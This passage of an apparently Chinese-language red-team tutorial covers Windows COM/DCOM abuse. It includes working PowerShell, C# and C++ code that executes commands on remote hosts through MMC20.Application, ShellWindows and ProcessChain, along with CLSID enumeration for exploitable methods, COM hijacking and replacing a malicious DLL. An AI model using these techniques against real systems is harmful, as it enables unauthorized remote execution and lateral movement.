    foreach ($p in $paths){$p;cmd /c dir $p > $null}
同样的，找文件夹的权限路径，如果everyone可写，可以替换恶意dll，然后使用rundll32加载
    rundll32.exe -sta {CLSID}
# DCOM横移
com是在计算机本地的实现，DCOM是COM的进一步扩展，DCOM通过远程过程调用(RPC)将com的功能在远程计算机上实现，可以将DCOM理解为通过RPC实现的COM。
调用DCOM需要的条件。
通常情况下，调用DCOM连接到远程计算机的时候，我们已经具有了本地管理员的权限
在很多com对象都看到APPid和CLSID是一个值，这里暂且将他们理解为CLSID的不同表示，就像GUID和CLSID一样
枚举支持DCOM的应用程序
    Get-CimInstance -class Win32_DCOMApplication | select appid,name
使用DCOM执行命令
    $com =[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","127.0.0.1"))
    $com.Document.ActiveView | gm           //查看方法
看到执行命令的方法
调用执行
    $com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,"/c calc.exe","Minimzed")
远程调用,需要关闭防火墙
    $com =[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.135.246")) 
    $com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,"/c calc.exe","Minimized")
另一种组件实现
    $com = [Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',"192.168.135.246")
    $obj = [System.Activator]::CreateInstance($com)
    $item = $obj.item()
    $item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe","c:\windows\system32",$null, 0)
除了这两种方法，支持DCOM调用的还有很多公开的方法，这里不再一一列举，需要注意的是，不同的组件对不同的操作系统兼容性不同，建议投入实战前先测试兼容性
    Methods                     APPID
    MMC20.Application           7e0423cd-1119-0928-900c-e6d4a52a0715
    ShellWindows                9BA05972-F6A8-11CF-A442-00A0C90A8F39
    ShellBrowserWindow          C08AFD90-F2A1-11D1-8455-00A0C91F3880
    Document.Application.ServiceStart()
    Document.Application.ServiceStop()
    Document.Application.IsServiceRunning()
    Document.Application.ShutDownWindows()
    Document.Application.GetSystemInformation()
怎么来查找是否可以被我们利用呢？
可以通过oleview.net 来查找对应的CLSID和启动权限，看到这里 `Launch Permission`为空，说明普通权限即可
### 武器化实现
c#方法
以shellwindows为例
    var CLSID = "9BA05972-F6A8-11CF-A442-00A0C90A8F39";
    Type ComType = Type.GetTypeFromCLSID(new Guid(CLSID), ComputerName);
    object RemoteComObject = Activator.CreateInstance(ComType);
    object Item = RemoteComObject.GetType().InvokeMember("Item", BindingFlags.InvokeMethod, null, RemoteComObject, new object[] { });
    object Document = Item.GetType().InvokeMember("Document", BindingFlags.GetProperty, null, Item, null);
    object Application = Document.GetType().InvokeMember("Application", BindingFlags.GetProperty, null, Document, null);
    Application.GetType().InvokeMember("ShellExecute", BindingFlags.InvokeMethod, null, Application, new object[] { BaseCommand, Parameters + " " + Command, Directory, null, 0 });
可以看到利用和powershell是一样的，只是需要一步步获取方法名，传参多一点
c++实现
实现思路
  1. 初始化com组件(CoInitializeEx) 
  2. 初始化com安全属性(CoInitializeSecurity) 
  3. 获取com组件的接口(CLSIDFromProgID) 
  4. 创建实例(CreateInstance) 
  5. 填写com组件参数 
  6. 清理释放(Release + CoUninitialize) 
实现demo
# com挖掘
### 已公开的com对象
可以通过下面代码遍历所有com组件和它导出的方法
    New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR
    Get-ChildItem -Path HKCR:\CLSID -Name | Select -Skip 1 > clsids.txt
可以查看所有的成员方法
    $Position  = 1
    $Filename = "win10-clsid-members.txt"
    $inputFilename = "clsids.txt"
    ForEach($CLSID in Get-Content $inputFilename) {
          Write-Output "$($Position) - $($CLSID)"
          Write-Output "------------------------" | Out-File $Filename -Append
          Write-Output $($CLSID) | Out-File $Filename -Append
          $handle = [activator]::CreateInstance([type]::GetTypeFromCLSID($CLSID))
          $handle | Get-Member | Out-File $Filename -Append
          $Position += 1
    }
找关键词
`execute`,`exec`,`spawn`,`launch`,`run`
接着进行相应的传参调用即可，类似shellWindows、mmc等
##### processChain的利用
实现是prchauto.dll，其中包含 tlib文件，可以用oleview打开
在注册表中找到该com组件的实现文件
查看方法，看到接受commandLine方法，说明可能存在利用
去oleview中查看对应的tlb中包含的成员等信息
将这个tlib文件保存到idl文件，然后使用MIDL将IDL文件转换成需要的c++头文件，头文件中会定义这个类和接口的使用方法。
补充一下：idl是一种接口定义语言，idl文件是接口定义文件，包含接口和类型库定义，MIDL是IDL文件的编译器
接下来编译idl，最开始的时候配置命令行版本的midl，但是老是报错，后面发现可以直接在vs里编译
可以查看midl的输出
编译后生成h文件和c文件
我们需要根据头文件来自己编程实现com组件的利用
main.cpp
    #define CLSID_ProcessChain L"{E430E93D-09A9-4DC5-80E3-CBB2FB9AF28E}"
    #define IID_IProcessChain  L"{79ED9CB4-3A01-4ABA-AD3C-A985EE298B20}"
    BOOL ProcessChain(wchar_t cmd[]) {
        HRESULT hr = 0;
        CLSID clsidIProcessChain = { 0 };
        IID iidIProcessChain = { 0 };
        IProcessChain* ProcessChain = NULL;
        BOOL bRet = FALSE;
        //初始化com环境
        CoInitialize(NULL);
        CLSIDFromString(CLSID_ProcessChain, &clsidIProcessChain);
        IIDFromString(IID_IProcessChain, &iidIProcessChain);
        //创建com接口
        hr = CoCreateInstance(clsidIProcessChain, NULL, CLSCTX_INPROC_SERVER, iidIProcessChain, (LPVOID*)&ProcessChain);
        //设置布尔值供start接受参数
        VARIANT_BOOL vb = VARIANT_TRUE;
        //设置参数
        ProcessChain->put_CommandLine((BSTR)cmd);
        //调用方法
        hr = ProcessChain->Start(&vb);
        printf("[+] Load successfully!");
        //释放
        CoUninitialize();
        return TRUE;
    }
### 未公开的com对象
需要利用一些逆向手段，和白加黑的挖掘比较相似(ps：以下方式仅仅是对这种方式的复现，并未去挖掘新的com利用)
那么，如果看不到它的方法或者参数怎么办呢？这个时候就需要我们去逆向
在oleview里找到该方法调用的参数
这种情况我们还无法确定是否可以创建其他进程
在ida里发现该dll确实调用了CreateProcess，虽然没有找到具体是哪个方法调用的，但基本可以确定该com对象是可以执行命令创建进程的，上文的利用也是印证了这一点
### 自动化挖掘
诚然，纯手工挖掘com组件是很耗时的一件事情，下面介绍自动化挖掘com的方法
项目地址
大致介绍
##### com劫持
发现是oleacc.dll
修改后启动ie浏览器，劫持成功
这种方式是不是比上面手动挖掘方便多了呢？但是也有缺点，找到的com并不完整，更深入的挖掘还是需要依靠手工
# 总结
com可以挖掘利用的点还有很多，浏览器、office等等各种功能都曾被挖掘出利用，现在已经成为对抗中的热门领域，非常值得深度研究，包括劫持横向提权等等……
本文也只是记录个人在学习com从0-1的过程，如果有理解错误的地方，欢迎大家指正
# 参考文章
* * *